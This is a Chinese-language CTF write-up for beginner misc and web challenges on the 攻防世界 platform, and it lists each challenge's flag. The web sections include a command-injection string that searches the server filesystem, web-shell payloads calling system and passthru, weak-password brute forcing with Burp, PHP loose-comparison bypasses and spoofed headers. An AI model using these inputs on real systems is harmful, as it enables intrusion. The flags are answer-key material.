# 攻防世界

## misc初级

### this is flag

提交flag{th1s_!s_a_d4m0_4la9}即可

### pdf

做法1：pdf转word后看到答案

在线转换地址https://app.xunjiepdf.com/pdf2word/

做法2：chrome打开pdf，直接ctrl+f搜索flag

### give_you_flag

正常打开gif，发现最后有一个二维码

用ps打开gif，找到那一帧，找到对应二维码

二维码需要四个角中三个角添加定位方块，用ps添加定位方块后，随便一个二维码扫描工具得到flag

### 坚持60s

得到jar文件，可以用压缩包软件打开文件还原出工程

使用idea打开工程，在爆炸文件下得到明文flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}

提交后显示flag错误，使用base64对flag中内容解码得到但

```
flag{DajiDali_JinwanChiji}
```

### gif

得到104张黑白图片

使用python读取文件，白为0黑为1，得到一个字符串

```
white = open("./0.jpg","rb").read()
black = open("./1.jpg","rb").read()

flag_dic = ""
for i in range(104):
	with open("./%d.jpg"%i,"rb") as f:
		if f.read() == white:
			flag_dic += "0"
		else:
			flag_dic += "1"
print(flag_dic)

01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101
```

使用在线的二进制转字符串工具得到答案

```
flag{FuN_giF}
```

### 掀桌子

最大字符不超过f，判断为十六进制

将两个连续数字设为一个字节，代表一个符号。所有字节大于128，而ASCII码表均小于128，故均减去128

得到flag

```
str = "c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"
count = 0
tempstr = ""
ans = ""
for s in str:
	tempstr += s
	if len(tempstr) == 2:
		ans += chr(int(tempstr, 16) - 128)
		# print(int(tempstr, 16))
		tempstr = ""
print(ans)

Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr
```

## web 初级

### view_souce

按F12，看到注释源码

```
cyberpeace{ffd40408d5b1b8c2dad9aab623dd93ef}
```

### robots

先用御剑或者dirsearch扫描一下给出的网站

得到目录下存在robots.txt文件

访问该文件，网页展示内容

```
User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
```

访问f1ag_1s_h3re.php

```
cyberpeace{57752958f46d76651078942ee34b88ba}
```

### backup

同理，用御剑扫一下后台，存在index.php.bak文件

访问这个文件，自动下载文件

使用sublime text打开文件，得到flag

```
Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}
```

### cookie

所需工具：firefox

可选工具：burp，wireshark

先打开网页，根据题目提示，在firefox按F12查看cookie

根据提示访问cookie.php

根据提示查看http response，得到flag

```
cyberpeace{5c1980e2f03a088816f306f7680d5458}
```

### disabled_button

工具：firefox

打开网页，显示按钮不能按

使用firefox，按F12检查网页源码，把button处的disabled去掉，即可提交

提交后得到flag

```
cyberpeace{a8efb264c88f7cba483ed431888a1d32}
```

### weak_auth

目的：爆破弱密码

工具：burp

proxy拦截提交的请求，将请求send to intruder，在intruder的position中更改数据包，使得提交的指定字段为变量，在intruder的payload中载入字典，点击attack

```
cyberpeace{4b4dda09ed661c8976f965b0681de325}
```

### command execution

输入localhost，看到请求为

```
target:"127.0.0.1"
```

尝试注入语句

```
" select database(); #
```

得到请求为

```
target:"+select+database();+#
```

说明不能注入

参考writeup，直接在命令行执行的ping，可以执行其他语句。又flag一般放在txt中，输入下列语句

```
127.0.0.1 && find / -name "*.txt" | grep flag
```

看到/home/flag.txt

查看文件内容得到flag

```
cyberpeace{168a646a5815f5b2f0e42e56812943d5}
```

### simple_php

需要知识点：php的弱类型比较

需要工具：直接在浏览器提交就行

```
写法1：?a='0'&b=1235a # 使a为字符串，b为非数字的一种变量
写法2：?a=0a&b=12345%00 # %00表示阶段，可以使b不为数字或数字字符串
```



#### php的弱类型比较

php有两种判断相等的方法，==，===

==会将两边值进行强制类型转换后在判断

===同时判断类型和值

```
if("admin"==0) //true
if("1admin"==1)//true
if("admin1"==1)//false
if("0e12324"=="0e1324")//true，当做科学技术法，都是0
```

### get_post

工具：firefox的hackbar插件

```
cyberpeace{f5206ff77800e22928b4d81206e083e5}
```

### xff_referer

工具：burpsuite

在burp的proxy里，把包拦下来，按照提示加入这两条就行

```
X-Forwarded-For: 123.123.123.123
Referer: https://www.google.com
```

得到答案

```
cyberpeace{2db9b3a38c581792bea6f015e6bdfdc8}
```

#### XFF和Referer

X-Forwarded-For：浏览器访问服务器时，使用的IP

Referer：浏览器告诉服务器，自己从哪个IP跳转来的

### web_shell

考察：php一句话木马，php执行shell命令

工具：中国蚁剑，中国菜刀，hackbar

做法1：中国蚁剑or中国菜刀

菜刀可以绕过认证部分，直接拿到webshell权限，之后查找flag即可

做法2：hackbar

在post data中写入 以下语句

首先查找当前目录文件

```
shell=system("ls")
```

写入以下任意一句

```
shell=passthru("cat flag.txt");
shell=system("cat flag.txt")
```

#### php执行shell命令

```
string system ( string $command [, int &$return_var ] )
string exec ( string $command [, array &$output [, int &$return_var ]] )
void passthru ( string $command [, int &$return_var ] )
```

### simple_js

考察：js阅读，转码

阅读js源码，发现dechiffre不管输入什么，都会根据

```
70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65
```

返回一个值。ASCII码范围为0~127，猜测这几个值为字符的ASCII码表示

代码里有一段十六进制的长字符串，猜测为答案

先把长字符串转换为十进制，再转换为字符，得到答案

```
Cyberpeace{786OsErtk12}
```

## web 高级

### baby_web

工具：firefox

看一下返回的响应头，就看到flag

```
flag{very_baby_web}
```

### Training-WWW-Robots

打开网页，根据提示在url输入/robots.txt

```
User-agent: *
Disallow: /fl0g.php


User-agent: Yandex
Disallow: *
```

在url输入/fl0g.php，得到flag

```
cyberpeace{04a3b25a4981849593d0b45e6f3b2717}
```

### Web_php_unserialize

根据网页上显示的源码，打开fl4g.php即可

由于var进行了base_64的解密得到，因此将fl4g.php进行base_64加密得到